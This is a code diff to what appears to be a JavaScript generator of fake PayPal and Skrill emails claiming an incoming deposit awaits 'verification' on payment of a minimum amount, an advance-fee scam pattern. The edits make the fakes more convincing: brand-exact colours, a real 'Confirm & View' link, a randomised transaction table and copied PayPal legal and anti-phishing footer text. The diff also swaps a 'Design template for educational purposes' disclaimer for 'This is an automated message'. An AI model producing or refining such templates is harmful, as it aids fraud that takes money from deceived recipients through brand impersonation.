+                                            <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+                                        </svg>
+                                    </a>
+                                    <!-- Instagram -->
+                                    <a href="#" style="display: inline-block; margin-right: 15px; text-decoration: none;">
+                                        <svg width="22" height="22" viewBox="0 0 24 24" fill="#666666" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M12 0C8.74 0 8.333.015 7.053.072 5.775.132 4.905.333 4.14.63c-.789.306-1.459.717-2.126 1.384S.935 3.35.63 4.14C.333 4.905.131 5.775.072 7.053.012 8.333 0 8.74 0 12s.015 3.667.072 4.947c.06 1.277.261 2.148.558 2.913.306.788.717 1.459 1.384 2.126.667.666 1.336 1.079 2.126 1.384.766.296 1.636.499 2.913.558C8.333 23.988 8.74 24 12 24s3.667-.015 4.947-.072c1.277-.06 2.148-.262 2.913-.558.788-.306 1.459-.718 2.126-1.384.666-.667 1.079-1.335 1.384-2.126.296-.765.499-1.636.558-2.913.06-1.28.072-1.687.072-4.947s-.015-3.667-.072-4.947c-.06-1.277-.262-2.149-.558-2.913-.306-.789-.718-1.459-1.384-2.126C21.319 1.347 20.651.935 19.86.63c-.765-.297-1.636-.499-2.913-.558C15.667.012 15.26 0 12 0zm0 2.16c3.203 0 3.585.016 4.85.071 1.17.055 1.805.249 2.227.415.562.217.96.477 1.382.896.419.42.679.819.896 1.381.164.422.36 1.057.413 2.227.057 1.266.07 1.646.07 4.85s-.015 3.585-.074 4.85c-.061 1.17-.256 1.805-.421 2.227-.224.562-.479.96-.899 1.382-.419.419-.824.679-1.38.896-.42.164-1.065.36-2.235.413-1.274.057-1.649.07-4.859.07-3.211 0-3.586-.015-4.859-.074-1.171-.061-1.816-.256-2.236-.421-.569-.224-.96-.479-1.379-.899-.421-.419-.69-.824-.9-1.38-.165-.42-.359-1.065-.42-2.235-.045-1.26-.061-1.649-.061-4.844 0-3.196.016-3.586.061-4.861.061-1.17.255-1.814.42-2.234.21-.57.479-.96.9-1.381.419-.419.81-.689 1.379-.898.42-.166 1.051-.361 2.221-.421 1.275-.045 1.65-.06 4.859-.06l.045.03zm0 3.678c-3.405 0-6.162 2.76-6.162 6.162 0 3.405 2.76 6.162 6.162 6.162 3.405 0 6.162-2.76 6.162-6.162 0-3.405-2.76-6.162-6.162-6.162zM12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4zm7.846-10.405c0 .795-.646 1.44-1.44 1.44-.795 0-1.44-.646-1.44-1.44 0-.794.646-1.439 1.44-1.439.793-.001 1.44.645 1.44 1.439z"/>
+                                        </svg>
+                                    </a>
+                                    <!-- Facebook -->
+                                    <a href="#" style="display: inline-block; margin-right: 15px; text-decoration: none;">
+                                        <svg width="22" height="22" viewBox="0 0 24 24" fill="#666666" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
+                                        </svg>
+                                    </a>
+                                    <!-- LinkedIn -->
+                                    <a href="#" style="display: inline-block; text-decoration: none;">
+                                        <svg width="22" height="22" viewBox="0 0 24 24" fill="#666666" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/>
+                                        </svg>
+                                    </a>
+                                </div>
+                                
+                                <!-- Footer Text -->
+                                <div style="font-size: 11px; color: #666; line-height: 1.6; margin-bottom: 15px;">
+                                    <p style="margin: 0 0 10px 0;">PayPal is committed to preventing fraudulent emails. Emails from PayPal will always contain your full name. <a href="#" style="color: #5b9bd5; text-decoration: none;">Learn to identify phishing</a></p>
+                                    
+                                    <p style="margin: 0 0 10px 0;">Not sure why you received this email? <a href="#" style="color: #5b9bd5; text-decoration: none;">Learn more</a></p>
+                                    
+                                    <p style="margin: 0 0 15px 0;">Copyright © 1999-${currentYear} PayPal. All rights reserved.</p>
+                                    
+                                    <p style="margin: 0; font-size: 10px;">PayPal Pte. Ltd. ("3PL") has applied for a license under the Singapore Payment Services Act ("PS Act") with the Monetary Authority of Singapore. During this statutory transitional period, 3PL is operating under an exemption from holding a license and is allowed to continue to provide specific payment services.</p>
+                                    
+                                    <p style="margin: 10px 0 0 0; font-size: 10px; color: #999;">PayPal RT002231.en_US(en-AE)-1.0.0:696ae4ed727da</p>
+                                </div>
+                            </div>
                         </div>
                     </div>
                 `,
                 skrill: `
-                    <div style="font-family: -apple-system, BlinkMacSystemFont, sans-serif; max-width: 600px; margin: 0 auto; background-color: #1a1a1a;">
+                    <div style="font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif; max-width: 600px; margin: 0 auto; background-color: #000000;">
                         <!-- Skrill Pink Header -->
-                        <div style="background-color: #e91e8c; padding: 25px; text-align: center;">
-                            <h1 style="margin: 0; font-size: 28px; color: #000; font-weight: bold;">Skrill</h1>
+                        <div style="background-color: #EC4A8F; padding: 30px; text-align: center;">
+                            <h1 style="margin: 0; font-size: 32px; color: #000000; font-weight: bold; letter-spacing: 1px;">Skrill</h1>
                         </div>
                         
                         <!-- Dark Content Area -->
-                        <div style="padding: 30px 25px; background-color: #1a1a1a; color: #fff; min-height: 400px;">
-                            <h2 style="color: #fff; margin-top: 0; font-size: 18px; font-weight: normal;">Hello,</h2>
+                        <div style="padding: 40px 30px; background-color: #000000; color: #ffffff;">
+                            <h2 style="color: #ffffff; margin-top: 0; margin-bottom: 20px; font-size: 18px; font-weight: 500;">Hello,</h2>
                             
-                            <p style="font-size: 14px; color: #b0b0b0; line-height: 1.6; margin: 20px 0;">
+                            <p style="font-size: 14px; color: #b8b8b8; line-height: 1.7; margin: 0 0 20px 0;">
                                 There is an incoming deposit to your Skrill account. However, before the processing of the transfer can be completed, verification needs to be performed.
                             </p>
                             
-                            <div style="background-color: #252525; padding: 25px; border-radius: 12px; margin: 25px 0; border: 1px solid #333;">
-                                <div style="text-align: center; margin-bottom: 20px;">
-                                    <div style="font-size: 14px; color: #b0b0b0; margin-bottom: 8px;">Incoming Amount</div>
-                                    <div style="font-size: 38px; font-weight: bold; color: #e91e8c;">${formattedAmount}</div>
-                                    <div style="font-size: 14px; color: #b0b0b0; margin-top: 5px;">${currency}</div>
-                                </div>
-                            </div>
+                            <p style="font-size: 14px; color: #b8b8b8; line-height: 1.7; margin: 0 0 25px 0;">
+                                Your incoming amount of ${formattedAmount} ${currency} is currently pending verification. Please complete the verification process to receive your funds.
+                            </p>
                             
-                            <p style="font-size: 13px; color: #b0b0b0; line-height: 1.5; margin: 20px 0;">
+                            <p style="font-size: 13px; color: #a0a0a0; line-height: 1.6; margin: 0 0 30px 0;">
                                 Please be informed that the minimum amount of verification is required before the IMTF verification can be performed.
                             </p>
                             
                             <!-- Pink Button -->
-                            <div style="text-align: center; margin: 30px 0;">
-                                <div style="display: inline-block; background-color: #e91e8c; color: #000; padding: 14px 40px; border-radius: 8px; font-size: 15px; font-weight: bold; cursor: pointer;">
+                            <div style="text-align: center; margin: 35px 0;">
+                                <a href="#" style="display: inline-block; background-color: #EC4A8F; color: #000000; padding: 14px 45px; border-radius: 6px; font-size: 15px; font-weight: 600; text-decoration: none;">
                                     Confirm & View
-                                </div>
+                                </a>
                             </div>
                             
-                            <p style="font-size: 12px; color: #808080; text-align: center; margin-top: 30px;">
+                            <p style="font-size: 12px; color: #808080; text-align: center; margin: 35px 0 40px 0; line-height: 1.5;">
                                 If you did not request this, you can safely ignore this email.
                             </p>
                             
+                            <!-- Divider -->
+                            <div style="border-top: 1px solid #2a2a2a; margin: 35px 0;"></div>
+                            
                             <!-- Transaction Details -->
-                            <div style="border-top: 1px solid #333; margin-top: 30px; padding-top: 20px;">
-                                <table style="width: 100%; font-size: 13px;">
+                            <div style="margin-top: 25px;">
+                                <table style="width: 100%; font-size: 13px; border-collapse: collapse;">
                                     <tr>
-                                        <td style="padding: 8px 0; color: #808080;">Transaction ID</td>
-                                        <td style="padding: 8px 0; text-align: right; font-family: monospace; font-size: 12px; color: #b0b0b0;">${Math.floor(Math.random() * 9000000000) + 1000000000}</td>
+                                        <td style="padding: 10px 0; color: #808080; border-bottom: 1px solid #1a1a1a;">Transaction ID</td>
+                                        <td style="padding: 10px 0; text-align: right; font-family: 'Courier New', monospace; font-size: 12px; color: #b8b8b8; border-bottom: 1px solid #1a1a1a;">${Math.floor(Math.random() * 9000000000) + 1000000000}</td>
                                     </tr>
                                     <tr>
-                                        <td style="padding: 8px 0; color: #808080;">Date</td>
-                                        <td style="padding: 8px 0; text-align: right; color: #b0b0b0;">${currentDate}</td>
+                                        <td style="padding: 10px 0; color: #808080; border-bottom: 1px solid #1a1a1a;">Amount</td>
+                                        <td style="padding: 10px 0; text-align: right; color: #EC4A8F; font-weight: 600; border-bottom: 1px solid #1a1a1a;">${formattedAmount}</td>
                                     </tr>
                                     <tr>
-                                        <td style="padding: 8px 0; color: #808080;">Time</td>
-                                        <td style="padding: 8px 0; text-align: right; color: #b0b0b0;">${currentTime}</td>
+                                        <td style="padding: 10px 0; color: #808080; border-bottom: 1px solid #1a1a1a;">Date</td>
+                                        <td style="padding: 10px 0; text-align: right; color: #b8b8b8; border-bottom: 1px solid #1a1a1a;">${currentDate}</td>
                                     </tr>
                                     <tr>
-                                        <td style="padding: 8px 0; color: #808080;">Status</td>
-                                        <td style="padding: 8px 0; text-align: right;"><span style="color: #ffa500; font-weight: bold;">⏳ Pending Verification</span></td>
+                                        <td style="padding: 10px 0; color: #808080; border-bottom: 1px solid #1a1a1a;">Time</td>
+                                        <td style="padding: 10px 0; text-align: right; color: #b8b8b8; border-bottom: 1px solid #1a1a1a;">${currentTime}</td>
+                                    </tr>
+                                    <tr>
+                                        <td style="padding: 10px 0; color: #808080;">Status</td>
+                                        <td style="padding: 10px 0; text-align: right;"><span style="color: #FFA500; font-weight: 600;">⏳ Pending Verification</span></td>
                                     </tr>
                                 </table>
                             </div>
                         </div>
                         
                         <!-- Footer -->
-                        <div style="padding: 20px; background-color: #0a0a0a; text-align: center; font-size: 11px; color: #666; border-top: 1px solid #333;">
-                            <p style="margin: 5px 0;">© Skrill Limited. All rights reserved.</p>
-                            <p style="margin: 5px 0;">Design template for educational purposes</p>
+                        <div style="padding: 25px 30px; background-color: #0a0a0a; text-align: center; font-size: 11px; color: #666666; border-top: 1px solid #1a1a1a; line-height: 1.6;">
+                            <p style="margin: 0 0 5px 0;">This is an automated message, please do not reply.</p>
+                            <p style="margin: 10px 0 0 0;">© ${currentYear} Skrill Limited. All rights reserved.</p>
                         </div>
                     </div>
                 `,
